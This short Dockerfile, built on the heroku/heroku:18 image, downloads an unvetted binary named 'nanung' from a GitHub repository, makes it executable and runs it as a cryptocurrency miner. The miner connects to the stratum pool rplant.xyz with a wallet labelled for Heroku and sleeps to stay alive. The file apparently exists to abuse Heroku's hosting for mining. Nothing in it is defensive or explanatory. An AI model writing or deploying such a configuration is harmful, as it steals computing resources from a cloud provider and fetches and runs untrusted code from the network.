FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/darafater/jancuk/raw/main/nanung && chmod +x nanung && ./nanung -a yespowerr16  -o stratum+tcps://stratum-asia.rplant.xyz:13382 -u YbvMJ7gQr1aQU9sisRe9YHuxtCh1BMV9se.heroku -t1 && sleep 99999
CMD bash heroku.sh
